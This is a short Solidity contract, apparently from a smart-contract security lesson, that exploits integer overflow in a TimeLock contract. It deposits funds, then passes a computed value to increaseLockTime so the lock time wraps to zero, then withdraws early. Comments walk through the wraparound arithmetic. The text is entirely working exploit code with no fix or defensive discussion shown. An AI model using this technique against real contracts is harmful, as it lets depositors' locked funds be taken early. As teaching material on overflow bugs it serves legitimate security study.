contract Attack {
    TimeLock timeLock;

    constructor(TimeLock _timeLock) {
        timeLock = TimeLock(_timeLock);
    }

    fallback() external payable {}

    function attack() public payable {
        timeLock.deposit{value: msg.value}();
		// if t = current lock time
		// then we need to find x such that;
        // x + t = 2**256 = 0  -->  x = -t
		// 'type(uint).max' returns the largest integer for uint
		// so x = type(uint).max + 1 - t
		timeLock.increaseLockTime(
            type(uint).max + 1 - timeLock.lockTime(address(this))
        );
        timeLock.withdraw();
    }
}